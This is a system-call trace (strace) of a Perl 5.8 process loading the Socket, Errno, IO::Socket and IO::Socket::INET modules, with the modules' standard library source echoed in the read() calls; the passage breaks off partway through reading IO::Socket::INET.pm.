6989  07:16:29.086098 stat64("/etc/perl/Socket.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.086111 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.086124 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.086137 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.086149 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.086163 stat64("/usr/lib/perl5/Socket.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.086174 stat64("/usr/lib/perl5/Socket.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.086187 stat64("/usr/share/perl5/Socket.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.086199 stat64("/usr/share/perl5/Socket.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.086211 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.086224 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
6989  07:16:29.086244 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 8
6989  07:16:29.086257 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ae778) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.086269 _llseek(8, 0, [0], SEEK_CUR) = 0
6989  07:16:29.086286 read(8, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
6989  07:16:29.086759 brk(0x8239000)    = 0x8239000
6989  07:16:29.086932 read(8, "", 4096) = 0
6989  07:16:29.086932 close(8)          = 0
6989  07:16:29.086932 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
6989  07:16:29.086933 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
6989  07:16:29.086933 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 8
6989  07:16:29.086933 read(8, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
6989  07:16:29.087019 fstat64(8, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
6989  07:16:29.087037 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 8, 0) = 0xb7d69000
6989  07:16:29.087050 mmap2(0xb7d6e000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 8, 0x4) = 0xb7d6e000
6989  07:16:29.087075 close(8)          = 0
6989  07:16:29.087682 brk(0x825a000)    = 0x825a000
6989  07:16:29.087827 stat64("/etc/perl/Errno.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.087844 stat64("/etc/perl/Errno.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.087862 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.087874 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.087888 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.087901 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.087914 stat64("/usr/lib/perl5/Errno.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.087926 stat64("/usr/lib/perl5/Errno.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.087939 stat64("/usr/share/perl5/Errno.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.087951 stat64("/usr/share/perl5/Errno.pm", 0xbf9ae96c) = -1 ENOENT (No such file or directory)
6989  07:16:29.087963 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbf9aea5c) = -1 ENOENT (No such file or directory)
6989  07:16:29.087976 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
6989  07:16:29.087996 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 8
6989  07:16:29.088011 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9ae778) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.088022 _llseek(8, 0, [0], SEEK_CUR) = 0
6989  07:16:29.088041 read(8, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
6989  07:16:29.088780 read(8, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
6989  07:16:29.089218 _llseek(8, 5966, [5966], SEEK_SET) = 0
6989  07:16:29.089235 _llseek(8, 0, [5966], SEEK_CUR) = 0
6989  07:16:29.089245 close(8)          = 0
6989  07:16:29.089624 brk(0x827b000)    = 0x827b000
6989  07:16:29.089749 read(6, "    }\n\n    $peer = accept($new,$sock)\n\tor return;\n\n    return wantarray ? ($new, $peer)\n    \t      \t     : $new;\n}\n\nsub sockname {\n    @_ == 1 or croak \'usage: $sock->sockname()\';\n    getsockname($_[0]);\n}\n\nsub peername {\n    @_ == 1 or croak \'usage: $sock->peername()\';\n    my($sock) = @_;\n    getpeername($sock)\n      || ${*$sock}{\'io_socket_peername\'}\n      || undef;\n}\n\nsub connected {\n    @_ == 1 or croak \'usage: $sock->connected()\';\n    my($sock) = @_;\n    getpeername($sock);\n}\n\nsub send {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $sock->send(BUF, [FLAGS, [TO]])\';\n    my $sock  = $_[0];\n    my $flags = $_[2] || 0;\n    my $peer  = $_[3] || $sock->peername;\n\n    croak \'send: Cannot determine peer address\'\n\t unless($peer);\n\n    my $r = defined(getpeername($sock))\n\t? send($sock, $_[1], $flags)\n\t: send($sock, $_[1], $flags, $peer);\n\n    # remember who we send to, if it was successful\n    ${*$sock}{\'io_socket_peername\'} = $peer\n\tif(@_ == 4 && defined $r);\n\n    $r;\n}\n\nsub recv {\n    @_ == 3 || @_ == 4 or croak \'usage: $sock->recv(BUF, LEN [, FLAGS])\';\n    my $sock  = $_[0];\n    my $len   = $_[2];\n    my $flags = $_[3] || 0;\n\n    # remember who we recv\'d from\n    ${*$sock}{\'io_socket_peername\'} = recv($sock, $_[1]=\'\', $len, $flags);\n}\n\nsub shutdown {\n    @_ == 2 or croak \'usage: $sock->shutdown(HOW)\';\n    my($sock, $how) = @_;\n    shutdown($sock, $how);\n}\n\nsub setsockopt {\n    @_ == 4 or croak \'$sock->setsockopt(LEVEL, OPTNAME)\';\n    setsockopt($_[0],$_[1],$_[2],$_[3]);\n}\n\nmy $intsize = length(pack(\"i\",0));\n\nsub getsockopt {\n    @_ == 3 or croak \'$sock->getsockopt(LEVEL, OPTNAME)\';\n    my $r = getsockopt($_[0],$_[1],$_[2]);\n    # Just a guess\n    $r = unpack(\"i\", $r)\n\tif(defined $r && length($r) == $intsize);\n    $r;\n}\n\nsub sockopt {\n    my $sock = shift;\n    @_ == 1 ? $sock->getsockopt(SOL_SOCKET,@_)\n\t    : $sock->setsockopt(SOL_SOCKET,@_);\n}\n\nsub atmark {\n    @_ == 1 or croak \'usage: $sock->atmark()\';\n    my($sock) = @_;\n    sockatmark($sock);\n}\n\nsub timeout {\n    @_ == 1 || @_ == 2 or croak \'usage: $sock->timeout([VALUE])\';\n    my($sock,$val) = @_;\n    my $r = ${*$sock}{\'io_socket_timeout\'};\n\n    ${*$sock}{\'io_socket_timeout\'} = defined $val ? 0 + $val : $val\n\tif(@_ == 2);\n\n    $r;\n}\n\nsub sockdomain {\n    @_ == 1 or croak \'usage: $sock->sockdomain()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_domain\'};\n}\n\nsub socktype {\n    @_ == 1 or croak \'usage: $sock->socktype()\';\n    my $sock = shift;\n    ${*$sock}{\'io_socket_type\'}\n}\n\nsub protocol {\n    @_ == 1 or croak \'usage: $sock->protocol()\';\n    my($sock) = @_;\n    ${*$sock}{\'io_socket_proto\'};\n}\n\n1;\n\n__END__\n\n", 4096) = 2603
6989  07:16:29.090263 _llseek(6, 6698, [6698], SEEK_SET) = 0
6989  07:16:29.090279 _llseek(6, 0, [6698], SEEK_CUR) = 0
6989  07:16:29.090290 close(6)          = 0
6989  07:16:29.090309 stat64("/etc/perl/IO/Socket/INET.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.090323 stat64("/etc/perl/IO/Socket/INET.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.090337 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.090351 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/INET.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.090365 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.090377 stat64("/usr/local/share/perl/5.8.8/IO/Socket/INET.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.090391 stat64("/usr/lib/perl5/IO/Socket/INET.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.090404 stat64("/usr/lib/perl5/IO/Socket/INET.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.090417 stat64("/usr/share/perl5/IO/Socket/INET.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.090429 stat64("/usr/share/perl5/IO/Socket/INET.pm", 0xbf9aee1c) = -1 ENOENT (No such file or directory)
6989  07:16:29.090442 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pmc", 0xbf9aef0c) = -1 ENOENT (No such file or directory)
6989  07:16:29.090459 stat64("/usr/lib/perl/5.8/IO/Socket/INET.pm", {st_mode=S_IFREG|0644, st_size=6497, ...}) = 0
6989  07:16:29.090480 open("/usr/lib/perl/5.8/IO/Socket/INET.pm", O_RDONLY|O_LARGEFILE) = 6
6989  07:16:29.090495 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf9aec28) = -1 ENOTTY (Inappropriate ioctl for device)
6989  07:16:29.090507 _llseek(6, 0, [0], SEEK_CUR) = 0
6989  07:16:29.090591 read(6, "# IO::Socket::INET.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::INET;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\nuse Exporter;\nuse Errno;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.29\";\n\nmy $EINVAL = exists(&Errno::EINVAL) ? Errno::EINVAL() : 1;\n\nIO::Socket::INET->register_domain( AF_INET );\n\nmy %socket_type = ( tcp  => SOCK_STREAM,\n\t\t    udp  => SOCK_DGRAM,\n\t\t    icmp => SOCK_RAW\n\t\t  );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"PeerAddr\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub _sock_info {\n  my($addr,$port,$proto) = @_;\n  my $origport = $port;\n  my @proto = ();\n  my @serv = ();\n\n  $port = $1\n\tif(defined $addr && $addr =~ s,:([\\w\\(\\)/]+)$,,);\n\n  if(defined $proto  && $proto =~ /\\D/) {\n    if(@proto = getprotobyname($proto)) {\n      $proto = $proto[2] || undef;\n    }\n    else {\n      $@ = \"Bad protocol \'$proto\'\";\n      return;\n    }\n  }\n\n  if(defined $port) {\n    my $defport = ($port =~ s,\\((\\d+)\\)$,,) ? $1 : undef;\n    my $pnum = ($port =~ m,^(\\d+)$,)[0];\n\n    @serv = getservbyname($port, $proto[0] || \"\")\n\tif ($port =~ m,\\D,);\n\n    $port = $serv[2] || $defport || $pnum;\n    unless (defined $port) {\n\t$@ = \"Bad service \'$origport\'\";\n\treturn;\n    }\n\n    $proto = (getprotobyname($serv[3]))[2] || undef\n\tif @serv && !$proto;\n  }\n\n return ($addr || undef,\n\t $port || undef,\n\t $proto || undef\n\t);\n}\n\nsub _error {\n    my $sock = shift;\n    my $err = shift;\n    {\n      local($!);\n      my $title = ref($sock).\": \";\n      $@ = join(\"\", $_[0] =~ /^$title/ ? \"\" : $title, @_);\n      close($sock)\n\tif(defined fileno($sock));\n    }\n    $! = $err;\n    return undef;\n}\n\nsub _get_addr {\n    my($sock,$addr_str, $multi) = @_;\n    my @addr;\n    if ($multi && 